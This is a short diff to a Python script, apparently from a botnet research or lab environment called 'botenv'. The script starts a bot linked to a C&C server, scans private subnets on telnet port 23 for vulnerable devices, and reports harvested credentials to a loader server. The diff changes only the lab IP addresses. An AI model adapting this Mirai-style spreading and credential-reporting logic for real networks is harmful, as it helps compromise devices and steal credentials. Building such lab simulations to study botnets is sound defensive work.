@@ -15,12 +15,12 @@ from botenv import bot, rando
 # Creates bot instance
 bot1 = bot.bot("bot1")
 # Start bot and connect to the C&C server
-bot1.start_bot(cc_ip='192.168.11.4', heart_beat=5)
+bot1.start_bot(cc_ip='192.168.100.11', heart_beat=5)
 
 for index in range(6):
     devices = []
     # Scan network for vulnerable devices
-    devices.append(bot1.scanner_init("192.168."+str(12+index)+".2", [23]))
+    devices.append(bot1.scanner_init("192.168.100."+str(2+index), [23]))
     devices = [device for device in devices if device is not None]
     print(devices)
     if devices:
@@ -30,5 +30,5 @@ for index in range(6):
         # Report user and password to loader server
         print(device)
         if device != None:
-            bot1.report_working(loader_ip = '192.168.11.5', device=device, auth_info=auth_info)
+            bot1.report_working(loader_ip = '192.168.100.12', device=device, auth_info=auth_info)
 
